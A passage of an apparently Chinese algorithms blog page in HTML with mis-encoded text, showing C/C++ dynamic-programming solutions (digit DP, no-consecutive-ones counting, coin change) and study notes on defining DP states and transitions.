class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1001</span>;<br><br><span class="hljs-type">int</span> dp[MAXN][<span class="hljs-number">11</span>][<span class="hljs-number">11</span>][<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a = <span class="hljs-number">0</span>; a &lt; n; a++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> b = <span class="hljs-number">0</span>; b &lt;= <span class="hljs-number">10</span>; b++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c = <span class="hljs-number">0</span>; c &lt;= <span class="hljs-number">10</span>; c++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> d = <span class="hljs-number">0</span>; d &lt;= <span class="hljs-number">1</span>; d++) &#123;<br>                    dp[a][b][c][d] = <span class="hljs-number">-1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; num, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> pp, <span class="hljs-type">int</span> p, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == num.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[i][pp][p][<span class="hljs-built_in">free</span>] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[i][pp][p][<span class="hljs-built_in">free</span>];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// å½“å‰æ¥åˆ°çš„å°±æ˜¯numçš„æœ€é«˜ä½</span><br>            ans = (ans + f(num, i + <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>)) % MOD; <span class="hljs-comment">// å½“å‰ä½ä¸é€‰æ•°å­—</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">1</span>; cur &lt; num[i] - <span class="hljs-string">&#x27;0&#x27;</span>; cur++) &#123;<br>                ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>            &#125;<br>            ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, num[i] - <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-number">0</span>)) % MOD;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// free == 0ï¼Œä¹‹å‰å’Œnumä¸€æ ·ï¼Œæ­¤æ—¶ä¸èƒ½è‡ªç”±é€‰æ‹©æ•°å­—</span><br>            <span class="hljs-comment">// å‰ä¸€ä½pï¼Œé€‰æ‹©è¿‡æ•°å­—ï¼Œp -&gt; 0 ~ 9</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt; num[i] - <span class="hljs-string">&#x27;0&#x27;</span>; cur++) &#123;<br>                <span class="hljs-keyword">if</span> (pp != cur &amp;&amp; p != cur) &#123;<br>                    ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (pp != num[i] - <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; p != num[i] - <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>                ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, num[i] - <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-number">0</span>)) % MOD;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// free == 1ï¼Œèƒ½è‡ªç”±é€‰æ‹©æ•°å­—</span><br>            <span class="hljs-comment">// ä»æ¥æ²¡é€‰è¿‡æ•°å­—</span><br>            ans = (ans + f(num, i + <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>)) % MOD; <span class="hljs-comment">// ä¾ç„¶ä¸é€‰æ•°å­—</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">1</span>; cur &lt;= <span class="hljs-number">9</span>; cur++) &#123;<br>                ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// free == 1ï¼Œèƒ½è‡ªç”±é€‰æ‹©æ•°å­—</span><br>            <span class="hljs-comment">// ä¹‹å‰é€‰æ‹©è¿‡æ•°å­—</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt;= <span class="hljs-number">9</span>; cur++) &#123;<br>                <span class="hljs-keyword">if</span> (pp != cur &amp;&amp; p != cur) &#123;<br>                    ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    dp[i][pp][p][<span class="hljs-built_in">free</span>] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; num)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> pp = <span class="hljs-number">-2</span>, p = <span class="hljs-number">-1</span>, i = <span class="hljs-number">0</span>; i &lt; num.size(); pp++, p++, i++) &#123;<br>        <span class="hljs-keyword">if</span> (pp &gt;= <span class="hljs-number">0</span> &amp;&amp; num[pp] == num[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (p &gt;= <span class="hljs-number">0</span> &amp;&amp; num[p] == num[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; num)</span> &#123;<br>    <span class="hljs-keyword">if</span> (num[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> n = num.size();<br>    <span class="hljs-type">long</span> all = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> base = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        all = (all + base * (num[i] - <span class="hljs-string">&#x27;0&#x27;</span>)) % MOD;<br>        base = (base * <span class="hljs-number">10</span>) % MOD;<br>    &#125;<br>    build(n);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>) ((all - f(num, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>) + MOD) % MOD);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">compute</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; l, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; r)</span> &#123;<br>    <span class="hljs-type">int</span> ans = (cnt(r) - cnt(l) + MOD) % MOD;<br>    <span class="hljs-keyword">if</span> (check(l)) &#123;<br>        ans = (ans + <span class="hljs-number">1</span>) % MOD;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> l, r;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">l_vec</span><span class="hljs-params">(l.begin(), l.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">r_vec</span><span class="hljs-params">(r.begin(), r.end())</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; compute(l_vec, r_vec) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ä¸å«è¿ç»­1çš„éè´Ÿæ•´æ•°"><a href="#ä¸å«è¿ç»­1çš„éè´Ÿæ•´æ•°" class="headerlink" title="ä¸å«è¿ç»­1çš„éè´Ÿæ•´æ•°"></a>ä¸å«è¿ç»­1çš„éè´Ÿæ•´æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ç»™å®šä¸€ä¸ªæ­£æ•´æ•°nï¼Œè¯·ä½ ç»Ÿè®¡åœ¨[0, n]èŒƒå›´çš„éè´Ÿæ•´æ•°ä¸­</span><br><span class="hljs-comment">// æœ‰å¤šå°‘ä¸ªæ•´æ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ä¸å­˜åœ¨è¿ç»­çš„1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">findIntegers1</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-number">31</span>)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    cnt[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> len = <span class="hljs-number">2</span>; len &lt;= <span class="hljs-number">30</span>; len++) &#123;<br>        cnt[len] = cnt[len - <span class="hljs-number">1</span>] + cnt[len - <span class="hljs-number">2</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> f(cnt, n, <span class="hljs-number">30</span>);<br>&#125;<br><br><span class="hljs-comment">// cnt[len] : äºŒè¿›åˆ¶å¦‚æœæœ‰lenä½ï¼Œæ‰€æœ‰äºŒè¿›åˆ¶çŠ¶æ€ä¸­ä¸å­˜åœ¨è¿ç»­çš„1çš„çŠ¶æ€æœ‰å¤šå°‘ä¸ªï¼Œè¾…åŠ©æ•°ç»„</span><br><span class="hljs-comment">// ä»numäºŒè¿›åˆ¶å½¢å¼çš„é«˜ä½å¼€å§‹ï¼Œå½“å‰æ¥åˆ°ç¬¬iä½ï¼Œä¹‹å‰çš„ä½å®Œå…¨å’Œnumä¸€æ ·</span><br><span class="hljs-comment">// è¿”å›&lt;=numä¸”ä¸å­˜åœ¨è¿ç»­çš„1çš„çŠ¶æ€æœ‰å¤šå°‘ä¸ª</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// numè‡ªèº«åˆæ³•</span><br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ((num &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) != <span class="hljs-number">0</span>) &#123;<br>        ans += cnt[i];<br>        <span class="hljs-keyword">if</span> ((num &amp; (<span class="hljs-number">1</span> &lt;&lt; (i + <span class="hljs-number">1</span>))) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// å¦‚æœnumäºŒè¿›åˆ¶çŠ¶æ€ï¼Œå‰ä¸€ä½æ˜¯1ï¼Œå½“å‰ä½ä¹Ÿæ˜¯1</span><br>            <span class="hljs-comment">// å¦‚æœå‰ç¼€ä¿æŒå’Œnumä¸€æ ·ï¼Œåç»­ä¸€å®šä¸åˆæ³•äº†</span><br>            <span class="hljs-comment">// æ‰€ä»¥æå‰è¿”å›</span><br>            <span class="hljs-keyword">return</span> ans;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// ä¹‹å‰çš„é«˜ä½å’Œnumä¸€æ ·ï¼Œä¸”åˆæ³•ï¼Œç»§ç»­å»i-1ä½é€’å½’</span><br>    ans += f(cnt, num, i - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">findIntegers2</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-number">31</span>)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    cnt[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> len = <span class="hljs-number">2</span>; len &lt;= <span class="hljs-number">30</span>; len++) &#123;<br>        cnt[len] = cnt[len - <span class="hljs-number">1</span>] + cnt[len - <span class="hljs-number">2</span>];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">30</span>; i &gt;= <span class="hljs-number">-1</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">-1</span>) &#123;<br>            ans++;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((n &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) != <span class="hljs-number">0</span>) &#123;<br>            ans += cnt[i];<br>            <span class="hljs-keyword">if</span> ((n &amp; (<span class="hljs-number">1</span> &lt;&lt; (i + <span class="hljs-number">1</span>))) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from findIntegers1: &quot;</span> &lt;&lt; findIntegers1(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from findIntegers2: &quot;</span> &lt;&lt; findIntegers2(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">opt[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// åˆå§‹åŒ–ï¼šå…‘æ¢é‡‘é¢ä¸º0æ—¶ï¼Œä¸éœ€è¦ä»»ä½•ç¡¬å¸</span><br><br><span class="hljs-comment">// é˜¶æ®µï¼ˆçº¿æ€§å¢é•¿ï¼‰ï¼šä»1é€æ­¥å¢åŠ åˆ°ç›®æ ‡é‡‘é¢amount</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= amount; i++) &#123;<br>    opt[i] = INF; <span class="hljs-comment">// è®¾ç½®å½“å‰é‡‘é¢içš„æœ€å°‘ç¡¬å¸æ•°é‡ä¸ºä¸€ä¸ªæå¤§å€¼ï¼ˆç”¨INFè¡¨ç¤ºï¼‰ï¼Œæ–¹ä¾¿åç»­æ¯”è¾ƒå–æœ€å°å€¼</span><br><br>    <span class="hljs-comment">// å†³ç­–ï¼ˆæ‰¾åˆ°å­é—®é¢˜ï¼‰ï¼šéå†æ¯ä¸ªç¡¬å¸é¢å€¼ï¼Œæ‰¾åˆ°å‡‘æˆå½“å‰é‡‘é¢çš„æœ€ä¼˜æ–¹æ¡ˆ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; coins.length; j++) &#123;<br>        <span class="hljs-keyword">if</span> (i - coins[j] &gt;= <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å¯ä»¥ç”¨å½“å‰ç¡¬å¸å‡‘æˆå½“å‰é‡‘é¢</span><br>            <span class="hljs-comment">// çŠ¶æ€ï¼ˆå…·æœ‰æœ€ä¼˜å­ç»“æ„ï¼‰ï¼šé€‰æ‹©æœ€å°çš„ç¡¬å¸æ•°é‡ï¼Œç¡®ä¿å½“å‰é‡‘é¢çš„æœ€ä¼˜è§£</span><br>            opt[i] = Math.<span class="hljs-built_in">min</span>(opt[i], opt[i - coins[j]] + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*æ— è®ºæ˜¯é€’æ¨å®ç°è¿˜æ˜¯è®°å¿†åŒ–æœç´¢(é€’å½’å®ç°)è¿™ç§å®šä¹‰çŠ¶æ€+æœ€ä¼˜å­ç»“æ„+æ¨å¯¼å…³ç³»çš„è§£é¢˜æ–¹æ³•å…¶å®å°±æ˜¯ åŠ¨æ€è§„åˆ’ ç®—æ³•</span><br><span class="hljs-comment">1.é—®é¢˜å®šä¹‰ï¼š</span><br><span class="hljs-comment">è®¾ opt[i] è¡¨ç¤ºå‡‘æˆé‡‘é¢ i æ‰€éœ€çš„æœ€å°‘ç¡¬å¸æ•°é‡ã€‚ç¡®å®šâ€œçŠ¶æ€â€çš„åŸåˆ™:å¯»æ‰¾å˜åŒ–ä¿¡æ¯</span><br><span class="hljs-comment">2.çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š</span><br><span class="hljs-comment">å¯¹äºæ¯ä¸ªé‡‘é¢ iï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å…¬å¼è®¡ç®— opt[i]ï¼šopt[i] = min&#123;opt[i - coin] + 1&#125; ç¡®å®šâ€œæœ€ä¼˜å­ç»“æ„â€çš„åŸåˆ™:å¯»æ‰¾ä»£è¡¨</span><br><span class="hljs-comment">3.è¾¹ç•Œï¼šopt[0]=0,opt[i]=+âˆ(i&gt;0)</span><br><span class="hljs-comment">4.ç›®æ ‡ï¼šopt[amount]</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><p><strong>äººåŠ›æ¨¡æ‹Ÿ &#x2F; æš´åŠ›æœç´¢</strong>ï¼š</p><ul><li>ç›®çš„æ˜¯é€šè¿‡æ‰‹åŠ¨æ¨¡æ‹Ÿé—®é¢˜è§£å†³è¿‡ç¨‹ï¼Œç†è§£å¦‚ä½•éå†æ‰€æœ‰å¯èƒ½çš„çŠ¶æ€å’Œæƒ…å†µã€‚</li><li>å…³æ³¨ç‚¹ï¼š<strong>è½®å»“å˜åŒ–</strong>ï¼Œåˆ†æçŠ¶æ€å¦‚ä½•ä»ä¸€ä¸ªè½¬ç§»åˆ°å¦ä¸€ä¸ªã€‚æˆ‘ä»¬æ˜¯ä¸æ˜¯è€ƒè™‘åœ¨åˆ—è¡¨æ—¶å€™å°±æ˜¯ä¸€ä¸ªè¡Œä¸€ä¸ªåˆ—ï¼Œå®ƒä»¬å¾€åæ¨ç§»,å› æ­¤ijä½œä¸ºä¸€ä¸ªçŠ¶æ€ã€‚lcså‘¢?é€‰å“ªä¸ªæ•°åˆšé€‰çš„è¿™ä¸ªæœ«å°¾æ˜¯ä¸æ˜¯ä¸€ä¸ªä½ç½®æŠŠè¿™ä¸ªè½®å»“æè¿°ä¸€ä¸‹è¡¨ç¤ºå­—ç¬¦ä¸² <code>text1</code> çš„æ¯ä¸ªå­—ç¬¦ä½ç½®ï¼Œåˆ—è¡¨ç¤ºå­—ç¬¦ä¸² <code>text2</code> çš„æ¯ä¸ªå­—ç¬¦ä½ç½®ã€‚æ¯ä¸ªæ ¼å­ <code>(i, j)</code> çš„å€¼ä»£è¡¨ <code>text1</code> çš„å‰ <code>i</code> ä¸ªå­—ç¬¦å’Œ <code>text2</code> çš„å‰ <code>j</code> ä¸ªå­—ç¬¦çš„LCSé•¿åº¦ã€‚æˆ‘ä»¬ä»å·¦ä¸Šè§’ <code>(0, 0)</code> å¼€å§‹è®¡ç®—ï¼Œé€æ­¥å¡«å……æ•´ä¸ªçŸ©é˜µï¼Œä¸€ç›´åˆ°å³ä¸‹è§’çš„ <code>(n, m)</code>ï¼Œæœ€ç»ˆç»“æœå³ <code>f[n][m]</code>ï¼Œä½œä¸ºä¸€ä¸ªçŠ¶æ€ä¹‹åï¼ŒæŠŠå†³ç­–å†™å¥½ï¼Œè¿™ä¸ªé¢˜ç›®å°±åšå®Œäº†ã€‚å®ƒæ•´ä½“çš„ä¸€ä¸ªå˜åŒ–æƒ…å†µå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬è¿™ä¸ªé¢˜ç›®çš„è½¬ç§»æ–¹ç¨‹äº†ã€‚</li></ul><p><strong>å®šä¹‰çŠ¶æ€</strong>ï¼šé€’å¢å¾ªç¯æ¯ä¸€ç»´å•Š,</p><ul><li>ç¡®å®šç”¨ä»€ä¹ˆå˜é‡æˆ–æ•°ç»„æ¥è¡¨ç¤ºé—®é¢˜ä¸­çš„ä¸åŒçŠ¶æ€ã€‚</li><li>å…³æ³¨ç‚¹ï¼š<strong>ä»£è¡¨</strong>ï¼ˆå¦‚ä»£è¡¨æŸä¸ªä½ç½®ã€å­é—®é¢˜çš„è§£ç­‰ï¼‰ï¼Œä»¥åŠçŠ¶æ€ä¹‹é—´çš„æ¨å¯¼å…³ç³»ã€‚</li></ul><p><strong>ç¡®å®šæœ€ä¼˜å­ç»“æ„</strong>ï¼š</p><ul><li>é€šè¿‡æ‰¾åˆ°å°é—®é¢˜çš„æœ€ä¼˜è§£æ¥ç»„æˆå¤§é—®é¢˜çš„æœ€ä¼˜è§£ã€‚</li><li>å…³æ³¨ç‚¹ï¼šæ‰‹åŠ¨æ¨¡æ‹Ÿæ—¶åšå‡ºçš„å†³ç­–ï¼Œè§‚å¯Ÿè¿™äº›å†³ç­–å¦‚ä½•å½±å“æœ€ç»ˆè§£ã€‚</li></ul><p><strong>å†™å‡ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹</strong>ï¼š</p><ul><li>æ ¹æ®ä¹‹å‰å®šä¹‰çš„çŠ¶æ€ï¼Œå†™å‡ºå¦‚ä½•ä»ä¸€ä¸ªçŠ¶æ€è½¬ç§»åˆ°å¦ä¸€ä¸ªçŠ¶æ€ï¼Œå½¢æˆé€’æ¨å…³ç³»ã€‚</li></ul><p><strong>ç¡®å®šè¾¹ç•Œã€ç›®æ ‡å’Œå®ç°</strong>ï¼š</p><ul><li>ç¡®å®šè¾¹ç•Œæ¡ä»¶ï¼ˆå¦‚èµ·ç‚¹å’Œç»“æŸç‚¹ï¼‰å’Œä¸åˆæ³•çš„çŠ¶æ€ã€‚</li><li>ç›®æ ‡æ˜¯æ‰¾åˆ°æœ€ç»ˆè¦æ±‚çš„è§£ï¼Œå¹¶æ ¹æ®çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä½¿ç”¨å¾ªç¯æˆ–é€’å½’æ¥å®ç°æ±‚è§£ã€‚</li></ul><p>ä¾‹å¤–</p><p>åŠ¨æ€è§„åˆ’æ‰“å°æ–¹æ¡ˆçš„åŸåˆ™</p><ol><li><strong>è®°å½•è½¬ç§»è·¯å¾„</strong>ï¼šåœ¨åŠ¨æ€è§„åˆ’çš„è®¡ç®—è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…è¦è®°å½•æ¯ä¸ªçŠ¶æ€çš„æœ€ä¼˜å€¼ï¼Œè¿˜éœ€è¦è®°å½•æ¯ä¸ªçŠ¶æ€çš„è½¬ç§»æ¥æº</li><li><strong>é€’å½’è¾“å‡º</strong>ï¼šåœ¨å¡«å®Œæ•´ä¸ªåŠ¨æ€è§„åˆ’è¡¨æ ¼åï¼Œä»ç»ˆç‚¹ï¼ˆå¦‚ <code>f[n][m]</code>ï¼‰å¼€å§‹ï¼Œæ²¿ç€è®°å½•çš„è·¯å¾„é€’å½’åœ°è¾“å‡ºæœ€ä¼˜æ–¹æ¡ˆ</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 